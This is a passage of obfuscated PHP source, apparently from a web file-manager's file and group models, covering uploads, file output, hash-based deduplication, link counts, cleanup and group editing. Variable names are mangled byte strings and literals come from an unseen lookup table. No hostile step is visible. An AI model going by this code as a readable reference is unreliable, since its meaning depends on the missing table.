$Ü…ƒ¥º½))->save(array($Ò¾¢´°[88] => $üØâ¡ËÓ)); } public function upload($äÈÚÁÔ, $À”æüƒ±, $Ö²ƒ„ó¹ = false, $æ˜Âó¼¹ = REPEAT_REPLACE) { $†ÚĞµÎÆ =& $_SERVER[ÓïÕü]; $ÔıÃê­ï = $this->parse($äÈÚÁÔ); $Ûñ…ëÑ¹ = $this->model->addFile($ÔıÃê­ï[$†ÚĞµÎÆ[478]], $À”æüƒ±, $ÔıÃê­ï[$†ÚĞµÎÆ[87]], $Ö²ƒ„ó¹, $æ˜Âó¼¹); return $this->getPathOuter($Ûñ…ëÑ¹); } public function uploadFileByID($£ÏëØïÓ, $â–ÈÅ‘—, $²°şšöƒ) { $´ËÅ”É =& $_SERVER[ÓïÕü]; $îº¯ÜÈ¹ = $this->parse($£ÏëØïÓ); $¬€˜ß…Ç = $this->model->addFileByFileID($îº¯ÜÈ¹[$´ËÅ”É[478]], $â–ÈÅ‘—, $îº¯ÜÈ¹[$´ËÅ”É[87]], $²°şšöƒ); return $this->getPathOuter($¬€˜ß…Ç); } public function addFileByRemote($¼­ª«½, $™êğ—î«, $¡Úñ Ñ = array(), $´ãı è„ = '', $«Ñ•‹Ç) { $ŞÑ…¢Ğ =& $_SERVER[ÓïÕü]; $Èõ¥ß›û = $this->parse($¼­ª«½); $´ãı è„ = empty($´ãı è„) ? $Èõ¥ß›û[$ŞÑ…¢Ğ[87]] : $´ãı è„; $°â€¥ú = $this->model->addFileByRemote($Èõ¥ß›û[$ŞÑ…¢Ğ[478]], $™êğ—î«, $´ãı è„, $¡Úñ Ñ, $«Ñ•‹Ç); return $this->getPathOuter($°â€¥ú); } public function uploadLink($¼Üà¹š¶, $ÇÔƒ¯‚Í = 0) { $‚ùïş =& $_SERVER[ÓïÕü]; $ÚûÓ’¢· = $this->parse($¼Üà¹š¶); $ö¤ëìÔÆ = _get($GLOBALS[$‚ùïş[7]], $‚ùïş[1458]); $®…áÒ™Æ = _get($GLOBALS[$‚ùïş[7]], $‚ùïş[1459]); $¿²ïÂø¢ = KodIO::ioFileDriverGet($‚ùïş[486] . $ÚûÓ’¢·[$‚ùïş[478]] . $‚ùïş[405]); $ñ“¹Òå = Model($‚ùïş[682])->createFileName($ÚûÓ’¢·[$‚ùïş[87]], $¿²ïÂø¢, $ö¤ëìÔÆ, $®…áÒ™Æ); return IO::uploadLink($ñ“¹Òå, $ÇÔƒ¯‚Í); } public function fileNameAuto($ÔÏ¹×…, $ÍÍ÷ò‡ò, $«´ÜÚÑ = REPEAT_REPLACE, $ä€Ğ‘¼á = false) { return $this->model->fileNameAuto($ÔÏ¹×…, $ÍÍ÷ò‡ò, $«´ÜÚÑ, $ä€Ğ‘¼á); } public function fileNameExist($Ò‡´½€, $«ÜÂ¸«) { return $this->model->fileNameExist($Ò‡´½€, $«ÜÂ¸«); } protected function _fileOut($´Èäë›², $ƒ¥á¥¬Ò = false, $“¢’÷ù = false, $«šØå¨µ = '', $©µàæ¬À = false) { $ŸôÈé„ =& $_SERVER[ÓïÕü]; $£–æãŒß = $this->model->sourceInfo($´Èäë›²); if ($£–æãŒß[$ŸôÈé„[488]] == $ŸôÈé„[91]) { header($ŸôÈé„[1460]); die; } $ØÚ·ŒÖ× = $this->model->fileInfoGet($´Èäë›²); $«šØå¨µ = $ØÚ·ŒÖ×[$ŸôÈé„[552]] ? $ØÚ·ŒÖ×[$ŸôÈé„[552]] : $«šØå¨µ; $§»øÄ– = isset($GLOBALS[$ŸôÈé„[183]]) && is_array($GLOBALS[$ŸôÈé„[183]]) ? $GLOBALS[$ŸôÈé„[183]][$ŸôÈé„[32]] : $£–æãŒß[$ŸôÈé„[32]]; if ($©µàæ¬À) { return IO::fileOutServer($ØÚ·ŒÖ×[$ŸôÈé„[87]], $ƒ¥á¥¬Ò, $§»øÄ–, $«šØå¨µ); } IO::fileOut($ØÚ·ŒÖ×[$ŸôÈé„[87]], $ƒ¥á¥¬Ò, $§»øÄ–, $«šØå¨µ); } public function fileOut($éÍë÷”³, $€µ·ª³¼ = false, $®§˜±ûÂ = false, $ú²ÀßÄ = '') { $this->_fileOut($éÍë÷”³, $€µ·ª³¼, $®§˜±ûÂ, $ú²ÀßÄ); } public function fileOutServer($‡­„«·, $‘ûÀÓÖ« = false, $ñÇõÃÂ = false, $©³¸µôÆ = '') { $this->_fileOut($‡­„«·, $‘ûÀÓÖ«, $ñÇõÃÂ, $©³¸µôÆ, !0); } protected function _fileOutImage($„¨¥ªÌÁ, $«ÂÅ¿í£ = 250) { $†ûš¡—‹ =& $_SERVER[ÓïÕü]; $†ò£Ò…Ğ = $this->model->pathInfo($„¨¥ªÌÁ); if ($†ò£Ò…Ğ[$†ûš¡—‹[488]] == $†ûš¡—‹[91]) { show_json($†ûš¡—‹[1461] . $„¨¥ªÌÁ, !1); } $ÀæİçÕ = $this->model->fileInfoGet($„¨¥ªÌÁ); $†ò£Ò…Ğ[$†ûš¡—‹[184]] = $ÀæİçÕ[$†ûš¡—‹[87]]; $GLOBALS[$†ûš¡—‹[183]] = $†ò£Ò…Ğ; IO::fileOutImage($ÀæİçÕ[$†ûš¡—‹[87]], $«ÂÅ¿í£); } public function fileOutImage($™¿‰Ùèº, $¿¿ªá¦ = 250) { $this->_fileOutImage($™¿‰Ùèº, $¿¿ªá¦); } public function fileOutImageServer($©àôøÌİ, $Ÿ¦İøé÷ = 250) { $this->_fileOutImage($©àôøÌİ, $Ÿ¦İøé÷); } public function link($ÈÍèëÄ, $Âï¾Šó = '') { $£şõ·Äâ = $this->model->fileInfoGet($ÈÍèëÄ); return IO::link($£şõ·Äâ[$_SERVER[ÓïÕü][87]], $Âï¾Šó); } protected function parse($¯éíµ«é) { $ô¯¸˜ş³ =& $_SERVER[ÓïÕü]; if (strstr($¯éíµ«é, $ô¯¸˜ş³[8]) === !1) { return array($ô¯¸˜ş³[496] => intval($¯éíµ«é), $ô¯¸˜ş³[87] => $ô¯¸˜ş³[12], $ô¯¸˜ş³[1457] => array()); } $˜§ÎùŸ = explode($ô¯¸˜ş³[8], trim($¯éíµ«é, $ô¯¸˜ş³[8])); if (count($˜§ÎùŸ) < 2) { show_tips(clear_html($¯éíµ«é) . $ô¯¸˜ş³[1462]); } return array($ô¯¸˜ş³[496] => intval($˜§ÎùŸ[0]), $ô¯¸˜ş³[87] => $˜§ÎùŸ[1], $ô¯¸˜ş³[1457] => array_slice($˜§ÎùŸ, 1)); } } goto a±éÅÜğ¤Ã; F÷¤ó²›£˜: class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\x6c\x65"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\x61\155\x65" => "\151\157\x5f\146\151\x6c\x65\x5f\155\145\x74\x61", "\155\x65\164\141\x46\151\145\x6c\x64" => "\x66\x69\154\x65\x49\104"); public function fileInfo($ğ„ïá°) { $Ú‰Áûª­ =& $_SERVER[ÓïÕü]; static $„à‹˜ï = array(); if (!isset($„à‹˜ï[$ğ„ïá°])) { $¬ò™Áã = $Ú‰Áûª­[2056]; $ÄßØ°ÒÇ = Model($Ú‰Áûª­[549])->field($¬ò™Áã)->where(array($Ú‰Áûª­[547] => $ğ„ïá°))->find(); $„à‹˜ï[$ğ„ïá°] = $ÄßØ°ÒÇ; } return $„à‹˜ï[$ğ„ïá°]; } public function addFileByContent($ìˆÃ¢é = '', $¡Ñ²òĞ°, $ˆö‘Ä«â = '') { $øÕñ‹¥ó =& $_SERVER[ÓïÕü]; $¡¿Áäñï = TEMP_PATH . $øÕñ‹¥ó[2057]; if (!is_dir($¡¿Áäñï)) { mk_dir($¡¿Áäñï); } $‹°îÌİ = $¡¿Áäñï . $øÕñ‹¥ó[2058] . rand_string(16); $šóŒôõˆ = file_put_contents($‹°îÌİ, $ìˆÃ¢é); if ($šóŒôõˆ === !1 || strlen($ìˆÃ¢é) != $šóŒôõˆ) { return !1; } $ëü˜¦ = $this->addFile($‹°îÌİ, $¡Ñ²òĞ°, $ˆö‘Ä«â, !0); if (file_exists($‹°îÌİ)) { @unlink($‹°îÌİ); } return $ëü˜¦; } public function createFileName($É¸şù‚æ, $ƒşÑ†Ò, $‚àï¯õ³ = false, $Êñ¿íò = false) { $İ¿ñ¾ëò =& $_SERVER[ÓïÕü]; $ŞòÌÈÜß = IO::init($İ¿ñ¾ëò[8]); $Ç®å¾‚¤ = $this->_makeFilePath($É¸şù‚æ, $ƒşÑ†Ò, $ŞòÌÈÜß, $‚àï¯õ³, $Êñ¿íò); $İıØÜƒü = $ŞòÌÈÜß->pathFather($Ç®å¾‚¤); static $œ‰¶×öÌ = false; $„ÑŠÆÜÌ = $İ¿ñ¾ëò[2059] . md5($İıØÜƒü); if (!$œ‰¶×öÌ && !Cache::get($„ÑŠÆÜÌ)) { $œ‰¶×öÌ = !0; $ıŒ¤ÇÌ» = IO::mkdir($İıØÜƒü); if (!IO::exist($ıŒ¤ÇÌ» . $İ¿ñ¾ëò[890])) { IO::mkfile($ıŒ¤ÇÌ» . $İ¿ñ¾ëò[890]); } Cache::set($„ÑŠÆÜÌ, 1, 3600 * 2); } return $Ç®å¾‚¤; } public function _makeFilePath($ÑáãµäÃ, $šÌ§ôÃ³, $§êÏíØ¦, $²©ÑÀò = false, $á¡ø¾Öá = false) { $¤ÃùÊáµ =& $_SERVER[ÓïÕü]; $½©›ƒ’¶ = Model($¤ÃùÊáµ[861])->get($¤ÃùÊáµ[2060]); $Òã‰Ø“Ú = $¤ÃùÊáµ[1350] . $šÌ§ôÃ³[$¤ÃùÊáµ[478]] . $¤ÃùÊáµ[487] . date($¤ÃùÊáµ[2061]); $Î’¢®Šµ = $Òã‰Ø“Ú . rand_string(5) . short_id(100); $ÑáãµäÃ = str_replace($¤ÃùÊáµ[8], $¤ÃùÊáµ[11], KodIO::clear($ÑáãµäÃ)); $¨ËÛŞá² = $§êÏíØ¦->ext($ÑáãµäÃ); if (!$ÑáãµäÃ) { $½©›ƒ’¶ = $¤ÃùÊáµ[867]; } switch ($½©›ƒ’¶) { case $¤ÃùÊáµ[2062]: if ($¨ËÛŞá²) { $Î’¢®Šµ = $Î’¢®Šµ . $¤ÃùÊáµ[10] . $¨ËÛŞá²; } if ($¨ËÛŞá² == $¤ÃùÊáµ[1999]) { $Î’¢®Šµ .= $¤ÃùÊáµ[1319]; } break; case $¤ÃùÊáµ[2063]: $ùÍĞÁ…Ã = Model($¤ÃùÊáµ[861])->get($¤ÃùÊáµ[862]); $’â±òà¢ = substr(md5($¤ÃùÊáµ[863] . $ùÍĞÁ…Ã . date($¤ÃùÊáµ[840])), 0, 8); $Òã‰Ø“Ú = $¤ÃùÊáµ[1350] . $šÌ§ôÃ³[$¤ÃùÊáµ[478]] . $¤ÃùÊáµ[487] . date($¤ÃùÊáµ[2064]) . $’â±òà¢ . $¤ÃùÊáµ[8]; if ($¨ËÛŞá² == $¤ÃùÊáµ[1999]) { $ÑáãµäÃ .= $¤ÃùÊáµ[1319]; } $ÓòÚûÏ­ = $¤ÃùÊáµ[2065] . $Òã‰Ø“Ú . $ÑáãµäÃ; CacheLock::lock($ÓòÚûÏ­); $Î’¢®Šµ = $Òã‰Ø“Ú . $ÑáãµäÃ; if (IO::exist($Òã‰Ø“Ú . $ÑáãµäÃ)) { $´Ï¥µë = substr($ÑáãµäÃ, 0, strlen($ÑáãµäÃ) - strlen($¨ËÛŞá²)); $ÉË‘´ = $á¡ø¾Öá ? substr($á¡ø¾Öá, 0, 5) : ($²©ÑÀò ? substr($²©ÑÀò, 0, 5) : rand_string(5)); $Î’¢®Šµ = $Òã‰Ø“Ú . $´Ï¥µë . $ÉË‘´; if ($¨ËÛŞá²) { $Î’¢®Šµ = $Î’¢®Šµ . $¤ÃùÊáµ[10] . $¨ËÛŞá²; } } if (IO::isOsDriver($Î’¢®Šµ) && !IO::isUploadServer($Î’¢®Šµ)) { if (IO::exist($Î’¢®Šµ)) { CacheLock::unlock($ÓòÚûÏ­); return $Î’¢®Šµ; } $şçúáÔö = IO::setContent($Î’¢®Šµ, $¤ÃùÊáµ[12]); if (!$şçúáÔö) { show_json($¤ÃùÊáµ[2066], !1); } } CacheLock::unlock($ÓòÚûÏ­); break; case $¤ÃùÊáµ[867]: break; default: break; } return $Î’¢®Šµ; } public function addFileByRemote($ËáâáÛÀ, $“ç±ä¡’, $¾ß‹Õ¹ = array()) { $ÏÈİ¾Å© =& $_SERVER[ÓïÕü]; if (!IO::exist($ËáâáÛÀ)) { return !1; } $’âôÎú  = $¾ß‹Õ¹[$ÏÈİ¾Å©[552]] ? $¾ß‹Õ¹[$ÏÈİ¾Å©[552]] : $ÏÈİ¾Å©[12]; $Ü¹»ŞûØ = IO::hashMd5($ËáâáÛÀ, $’âôÎú ); $¯Şî¢Â¢ = KodIO::parse($ËáâáÛÀ); $¦¤™ğ³ = array($ÏÈİ¾Å©[625] => IO::size($ËáâáÛÀ), $ÏÈİ¾Å©[2067] => 1, $ÏÈİ¾Å©[497] => $“ç±ä¡’, $ÏÈİ¾Å©[904] => $¯Şî¢Â¢[$ÏÈİ¾Å©[478]], $ÏÈİ¾Å©[498] => $ËáâáÛÀ, $ÏÈİ¾Å©[2068] => $¾ß‹Õ¹[$ÏÈİ¾Å©[680]] ? $¾ß‹Õ¹[$ÏÈİ¾Å©[680]] : IO::hashSimple($ËáâáÛÀ), $ÏÈİ¾Å©[2069] => $Ü¹»ŞûØ ? $Ü¹»ŞûØ : $’âôÎú ); if ($½”¨•Ç† = $this->addFileCheckExist($¦¤™ğ³[$ÏÈİ¾Å©[680]], $¦¤™ğ³[$ÏÈİ¾Å©[552]], $¦¤™ğ³[$ÏÈİ¾Å©[79]])) { return $½”¨•Ç†; } return $this->addFileData($¦¤™ğ³); } private function addFileData($øıËõ¤Å) { $‰ä¬ğƒ£ =& $_SERVER[ÓïÕü]; if (!$øıËõ¤Å) { return !1; } $øıËõ¤Å[$‰ä¬ğƒ£[79]] = intval($øıËõ¤Å[$‰ä¬ğƒ£[79]]); if (!$øıËõ¤Å[$‰ä¬ğƒ£[79]] && strlen($øıËõ¤Å[$‰ä¬ğƒ£[680]]) > 32) { $øıËõ¤Å[$‰ä¬ğƒ£[79]] = intval(substr($øıËõ¤Å[$‰ä¬ğƒ£[680]], 32)); } $íí¤¤å‘ = $this->add($øıËõ¤Å); return $this->find($íí¤¤å‘); } public function addFile($€ûÕ‹³, $÷‰ê, $ˆå™“â×, $”æúƒê = false) { $åßú‚âƒ =& $_SERVER[ÓïÕü]; $ì¸…œ¢Õ = IO::hashSimple($€ûÕ‹³); $¬Çô‹Œ¿ = IO::size($€ûÕ‹³); $ìÆ„Ù´ = $¬Çô‹Œ¿ <= 1024 * 1024 * 10 ? IO::hashMd5($€ûÕ‹³) : $åßú‚âƒ[12]; $Ş¿¬µµ = $åßú‚âƒ[2070] . $ì¸…œ¢Õ; CacheLock::lock($Ş¿¬µµ); if ($ìÆ„Ù´ && $ì¸…œ¢Õ) { $ÈÉöúÔÄ = $this->addFileCheckExist($ì¸…œ¢Õ, $ìÆ„Ù´, $¬Çô‹Œ¿); if ($ÈÉöúÔÄ) { CacheLock::unlock($Ş¿¬µµ); return $ÈÉöúÔÄ; } } $Óçœ¡Â‹ = $this->addFileMake($€ûÕ‹³, $÷‰ê, $¬Çô‹Œ¿, $ì¸…œ¢Õ, $ìÆ„Ù´, $ˆå™“â×, $”æúƒê); $öœÂ·­ê = $this->addFileData($Óçœ¡Â‹); if (!$öœÂ·­ê) { return !1; } CacheLock::unlock($Ş¿¬µµ); if (!$ìÆ„Ù´ && $öœÂ·­ê) { $this->fileMd5Check($öœÂ·­ê); } return $öœÂ·­ê; } public function fileMd5Check($‰´ñˆÔ¯) { $›Ê¦Í˜‡ =& $_SERVER[ÓïÕü]; $Ä™ˆ¡ç„ = array($‰´ñˆÔ¯[$›Ê¦Í˜‡[546]], $‰´ñˆÔ¯[$›Ê¦Í˜‡[87]]); $ãÔ–İĞÓ = $›Ê¦Í˜‡[2071] . $‰´ñˆÔ¯[$›Ê¦Í˜‡[87]]; $óüŒ®Ï = $›Ê¦Í˜‡[2072] . $‰´ñˆÔ¯[$›Ê¦Í˜‡[546]]; TaskQueue::add($›Ê¦Í˜‡[2073], $Ä™ˆ¡ç„, $ãÔ–İĞÓ, $óüŒ®Ï); } public function fileMd5Set($ˆ¸ìêè‹, $Èî£‚¿‡) { $ØíŒ»Ê– =& $_SERVER[ÓïÕü]; $Ë‡ô‹ü† = $this->find($ˆ¸ìêè‹); if (!$Ë‡ô‹ü† || $Ë‡ô‹ü†[$ØíŒ»Ê–[552]]) { return; } $–’ê­û© = IO::hashMd5($Èî£‚¿‡); if (!$–’ê­û©) { return $ØíŒ»Ê–[12]; } $this->where(array($ØíŒ»Ê–[546] => $ˆ¸ìêè‹))->save(array($ØíŒ»Ê–[552] => $–’ê­û©)); } public function addFileMake($šÌŸ¿ÑŠ, $Èë˜†Áó, $«“à¾·, $Ïà÷ª’Â, $¤•µªÖŠ, $ó´¼¸À”, $‡É…Æò‡) { $™¬°ø†¸ =& $_SERVER[ÓïÕü]; $ÜíùšŠã = $this->createFileName($ó´¼¸À”, $Èë˜†Áó, $Ïà÷ª’Â, $¤•µªÖŠ); $É¯Ìûôı = get_path_father($ÜíùšŠã); $¢ÔÈ‰÷í = get_path_this($ÜíùšŠã); if ($‡É…Æò‡) { $‘Ñô±°• = IO::move($šÌŸ¿ÑŠ, $É¯Ìûôı, !1, $¢ÔÈ‰÷í); } else { $‘Ñô±°• = IO::copy($šÌŸ¿ÑŠ, $É¯Ìûôı, !1, $¢ÔÈ‰÷í); } if (!$‘Ñô±°•) { return !1; } $…°“Í˜é = IO::init($‘Ñô±°•); $…°“Í˜é->cacheMethod($™¬°ø†¸[182], $…°“Í˜é->path, $™¬°ø†¸[179]); if (IO::size($‘Ñô±°•) != $«“à¾·) { return !1; } $ÌÖĞ–¬ = array($™¬°ø†¸[625] => $«“à¾·, $™¬°ø†¸[2067] => 1, $™¬°ø†¸[497] => $ó´¼¸À”, $™¬°ø†¸[904] => $Èë˜†Áó[$™¬°ø†¸[478]], $™¬°ø†¸[498] => $ÜíùšŠã, $™¬°ø†¸[2068] => $Ïà÷ª’Â, $™¬°ø†¸[2069] => $¤•µªÖŠ); return $ÌÖĞ–¬; } public function addFileCheckExist($õµÏ¿¾, $ìùöÃÎ, $Áåî†È¯) { $á¼ËŒ¹ß =& $_SERVER[ÓïÕü]; $¤Ò¤ˆ«º = $this->findByHash($õµÏ¿¾, $ìùöÃÎ); if (!$¤Ò¤ˆ«º) { return !1; } $âšµ“°¸ = array($á¼ËŒ¹ß[2067] => intval($¤Ò¤ˆ«º[$á¼ËŒ¹ß[2074]]) + 1, $á¼ËŒ¹ß[625] => $Áåî†È¯); $this->where(array($á¼ËŒ¹ß[547] => $¤Ò¤ˆ«º[$á¼ËŒ¹ß[546]]))->save($âšµ“°¸); return $¤Ò¤ˆ«º; } public function remove($ò¿òÚõ) { $this->linkCountChange($ò¿òÚõ, !1); $this->clearEmpty(); return !0; } public function linkAdd($¹ìƒ˜…¹) { $this->linkCountChange($¹ìƒ˜…¹, !0); } public function linkCountChange($Ğ§ØŞ›, $ïëì÷ú…) { $òÄ¶îøÇ =& $_SERVER[ÓïÕü]; if (!$Ğ§ØŞ›) { return; } if (!is_array($Ğ§ØŞ›)) { $Ğ§ØŞ› = array($Ğ§ØŞ›); } $Ú ˜¼­ = array(); foreach ($Ğ§ØŞ› as $¿ä¬‘ç) { $¡òÊç‚¡ = $¿ä¬‘ç . $òÄ¶îøÇ[12]; if (!$Ú ˜¼­[$¡òÊç‚¡]) { $Ú ˜¼­[$¡òÊç‚¡] = 0; } $Ú ˜¼­[$¡òÊç‚¡]++; } $Ù·òøš’ = array(); foreach ($Ú ˜¼­ as $¿ä¬‘ç => $İ™€™§Œ) { $¡òÊç‚¡ = $İ™€™§Œ . $òÄ¶îøÇ[12]; if (!$Ù·òøš’[$¡òÊç‚¡]) { $Ù·òøš’[$¡òÊç‚¡] = array(); } $Ù·òøš’[$¡òÊç‚¡][] = $¿ä¬‘ç; } foreach ($Ù·òøš’ as $İ™€™§Œ => $ãğã—Àİ) { if (!$ãğã—Àİ) { continue; } $İ™€™§Œ = $ïëì÷ú… ? $İ™€™§Œ : -intval($İ™€™§Œ); $ÆÁ‹ğÁè = array($òÄ¶îøÇ[546] => array($òÄ¶îøÇ[7], $ãğã—Àİ)); if ($İ™€™§Œ < 0) { $ÆÁ‹ğÁè[$òÄ¶îøÇ[2074]] = array($òÄ¶îøÇ[1119], abs($İ™€™§Œ)); } $this->where($ÆÁ‹ğÁè)->setAdd($òÄ¶îøÇ[2074], $İ™€™§Œ); } } public function findByHash($î×Á¾µ­, $¾üó·ï = false) { $ˆ˜©ç…ü =& $_SERVER[ÓïÕü]; if (!$î×Á¾µ­ && !$¾üó·ï) { return !1; } $­×ÎİØÅ = array($ˆ˜©ç…ü[2068] => $î×Á¾µ­); if ($¾üó·ï) { $­×ÎİØÅ = array($ˆ˜©ç…ü[2069] => $¾üó·ï); } return $this->order($ˆ˜©ç…ü[2075])->where($­×ÎİØÅ)->find(); } public function clearEmpty($±Ã†Êí’ = 1) { $ßé†‘…ª =& $_SERVER[ÓïÕü]; $Òì·şª” = time() - 3600 * 24 * $±Ã†Êí’; $·âëÖ£ã = $ßé†‘…ª[2076] . $Òì·şª”; $ŸÎÙŒ“¯ = $this->where($·âëÖ£ã)->select(); if (!$ŸÎÙŒ“¯) { return; } $ŒŸáß€ = new Task($ßé†‘…ª[2077], $ßé†‘…ª[12], count($ŸÎÙŒ“¯)); foreach ($ŸÎÙŒ“¯ as $ØÎ–°ºó) { $ŒŸáß€->update(1); $this->resetFile($ØÎ–°ºó); } $ŒŸáß€->end(); } public function resetFile($®¡€´ÆÁ) { $åÕÔŸøª =& $_SERVER[ÓïÕü]; $¼ŸÖÅ´Í = array($åÕÔŸøª[547] => $®¡€´ÆÁ[$åÕÔŸøª[546]]); $÷Ò±¦öÑ = Model($åÕÔŸøª[1456])->where($¼ŸÖÅ´Í)->count(); $±´ Ä = Model($åÕÔŸøª[2078])->where($¼ŸÖÅ´Í)->count(); $¨æ®¾ü = intval($÷Ò±¦öÑ) + intval($±´ Ä); if ($¨æ®¾ü == 0) { IO::remove($®¡€´ÆÁ[$åÕÔŸøª[87]]); Model($åÕÔŸøª[2079])->delete($®¡€´ÆÁ[$åÕÔŸøª[546]]); $this->where($¼ŸÖÅ´Í)->delete(); $this->metaSet($®¡€´ÆÁ[$åÕÔŸøª[546]], null, null); write_log(ACTION . $åÕÔŸøª[2080] . KodUser::id() . $åÕÔŸøª[2081] . $®¡€´ÆÁ[$åÕÔŸøª[546]] . $åÕÔŸøª[2082] . $®¡€´ÆÁ[$åÕÔŸøª[79]] . $åÕÔŸøª[202] . $®¡€´ÆÁ[$åÕÔŸøª[87]], $åÕÔŸøª[2083]); return; } if ($®¡€´ÆÁ[$åÕÔŸøª[2074]] != $¨æ®¾ü) { $this->where($¼ŸÖÅ´Í)->save(array($åÕÔŸøª[2067] => $¨æ®¾ü)); } } public function storageInfo($×ªÇ¶ßÜ = false) { $ÚçÙ¿¡† =& $_SERVER[ÓïÕü]; $ÀµıÕÏ¿ = $this->count() + 0.0; $­ÀÄãî = 0; $Ë¸òüÑ‘ = 1; $µ¤¦è‚¡ = 0; $ªø¹ü = 5000; for ($«Û…ê·© = 0; $«Û…ê·© < $ÀµıÕÏ¿; $«Û…ê·© = $«Û…ê·© + $ªø¹ü) { $¦£Ò• = $this->limit($«Û…ê·©, $«Û…ê·© + $ªø¹ü)->select(); foreach ($¦£Ò• as $†®ÑÀºÂ) { $Ë¸òüÑ‘ += $†®ÑÀºÂ[$ÚçÙ¿¡†[79]] * $†®ÑÀºÂ[$ÚçÙ¿¡†[2074]]; $­ÀÄãî += $†®ÑÀºÂ[$ÚçÙ¿¡†[79]] * ($†®ÑÀºÂ[$ÚçÙ¿¡†[2074]] - 1); $µ¤¦è‚¡ += $†®ÑÀºÂ[$ÚçÙ¿¡†[2074]]; } } $Ê­©“Ô = array($ÚçÙ¿¡†[2084] => $Ë¸òüÑ‘, $ÚçÙ¿¡†[2085] => $­ÀÄãî, $ÚçÙ¿¡†[2086] => $­ÀÄãî / $Ë¸òüÑ‘, $ÚçÙ¿¡†[83] => $ÀµıÕÏ¿, $ÚçÙ¿¡†[2087] => $µ¤¦è‚¡); return $Ê­©“Ô; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\x75\160"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\141\x6d\145" => "\x67\162\157\165\x70\x5f\x6d\x65\164\x61", "\155\145\164\141\106\x69\x65\x6c\x64" => "\147\x72\157\x75\x70\111\104"); protected function cacheFunctionAlias($¦şâÄ­ç) { $ñÄ¹€âÑ =& $_SERVER[ÓïÕü]; return array($ñÄ¹€âÑ[2088] => array($¦şâÄ­ç[0], $ñÄ¹€âÑ[2089]), $ñÄ¹€âÑ[2090] => array($¦şâÄ­ç[0], $ñÄ¹€âÑ[2091])); } protected function getInfo($ø’¢ß²ø, $Ÿ×šò¢ = false) { $œ‘’¿ò = $this->getInfoSimple($ø’¢ß²ø); if (!$œ‘’¿ò) { return !1; } if ($Ÿ×šò¢) { return $this->_listDataApplyItem($œ‘’¿ò); } return $this->cacheFunctionGet($_SERVER[ÓïÕü][2092], $ø’¢ß²ø); } protected function getInfoSimple($óâ‹Úß, $ôŠã°ìÑ = false) { $Îš‘Â€æ =& $_SERVER[ÓïÕü]; if ($ôŠã°ìÑ) { $Çõé—êğ = array($Îš‘Â€æ[1418] => intval($óâ‹Úß)); $Òºç§ƒ¸ = $this->where($Çõé—êğ)->find(); return is_array($Òºç§ƒ¸) ? $Òºç§ƒ¸ : array(); } return $this->cacheFunctionGet($Îš‘Â€æ[2093], $óâ‹Úß); } protected function groupAdd($èğ ¼‰) { $•Ú²õêï =& $_SERVER[ÓïÕü]; if (!$èğ ¼‰[$•Ú²õêï[193]] && isset($èğ ¼‰[$•Ú²õêï[1418]]) && $èğ ¼‰[$•Ú²õêï[1418]] == 1) { if ($şø‡±î£ = $this->getInfoSimple($èğ ¼‰[$•Ú²õêï[1418]], !0)) { return $èğ ¼‰[$•Ú²õêï[1418]]; } } else { $şø‡±î£ = $this->getInfoSimple($èğ ¼‰[$•Ú²õêï[193]]); if (!$şø‡±î£) { return !1; } } $º¢Ù¥Ó = $•Ú²õêï[598]; if ($şø‡±î£[$•Ú²õêï[589]]) { $º¢Ù¥Ó = $şø‡±î£[$•Ú²õêï[589]] . $şø‡±î£[$•Ú²õêï[1418]] . $•Ú²õêï[50]; } $¹ĞÇß¥æ = array($•Ú²õêï[497] => $this->groupNameAuto($èğ ¼‰[$•Ú²õêï[193]], $èğ ¼‰[$•Ú²õêï[32]]), $•Ú²õêï[480] => $èğ ¼‰[$•Ú²õêï[193]], $•Ú²õêï[660] => $º¢Ù¥Ó, $•Ú²õêï[2094] => $èğ ¼‰[$•Ú²õêï[1993]], $•Ú²õêï[2095] => 0, $•Ú²õêï[2010] => 0); $èğ ¼‰[$•Ú²õêï[32]] = $¹ĞÇß¥æ[$•Ú²õêï[32]]; if (isset($èğ ¼‰[$•Ú²õêï[2030]])) { $¹ĞÇß¥æ[$•Ú²õêï[2030]] = $èğ ¼‰[$•Ú²õêï[2030]]; } else { $äïÍ¡†¾ = $this->max($•Ú²õêï[2030]); if (!$äïÍ¡†¾) { $äïÍ¡†¾ = 0; } $¹ĞÇß¥æ[$•Ú²õêï[2030]] = $äïÍ¡†¾ + 1; } if (!empty($èğ ¼‰[$•Ú²õêï[1418]])) { $¹ĞÇß¥æ[$•Ú²õêï[1418]] = $èğ ¼‰[$•Ú²õêï[1418]]; } $×Š±ÛúÍ = $this->add($¹ĞÇß¥æ); $this->groupMetaEdit($×Š±ÛúÍ, $èğ ¼‰); Model($•Ú²õêï[1456])->groupRootAdd($×Š±ÛúÍ); $this->_clearCache($èğ ¼‰[$•Ú²õêï[193]]); return $×Š±ÛúÍ; } protected function groupEdit($Ú³ª‚ç’, $€ú’úœ®) { $ıÙüîÔÒ =& $_SERVER[ÓïÕü]; $îáûæŠ— = $this->getInfoSimple($Ú³ª‚ç’); if (!$îáûæŠ—) { return !1; } if (!empty($€ú’úœ®[$ıÙüîÔÒ[193]])) { $ôüŞœØ = $this->getInfoSimple($€ú’úœ®[$ıÙüîÔÒ[193]]); if (!$ôüŞœØ) { return !1; } if ($îáûæŠ—[$ıÙüîÔÒ[1418]] == $ôüŞœØ[$ıÙüîÔÒ[1418]]) { return !1; } if ($€ú’úœ®[$ıÙüîÔÒ[193]] != $îáûæŠ—[$ıÙüîÔÒ[193]]) { if ($ôüŞœØ[$ıÙüîÔÒ[589]] !== $îáûæŠ—[$ıÙüîÔÒ[589]] && strpos($ôüŞœØ[$ıÙüîÔÒ[589]], $îáûæŠ—[$ıÙüîÔÒ[589]] . $îáûæŠ—[$ıÙüîÔÒ[1418]] . $ıÙüîÔÒ[50]) === 0) { return !1; } $€ú’úœ®[$ıÙüîÔÒ[660]] = $ôüŞœØ[$ıÙüîÔÒ[589]] . $€ú’úœ®[$ıÙüîÔÒ[193]] . $ıÙüîÔÒ[50]; $this->_changeChildLevel($îáûæŠ—, $ôüŞœØ); $this->_clearCache($ôüŞœØ[$ıÙüîÔÒ[1418]]); $this->_clearCache($îáûæŠ—[$ıÙüîÔÒ[193]]); } } $this->groupMetaEdit($Ú³ª‚ç’, $€ú’úœ®); $this->_clearChildrenCache($îáûæŠ—); return $this->where(array($ıÙüîÔÒ[2096] => $Ú³ª‚ç’))->save($€ú’úœ®); } private function groupMetaEdit($Ïæ¸ÖÜˆ, 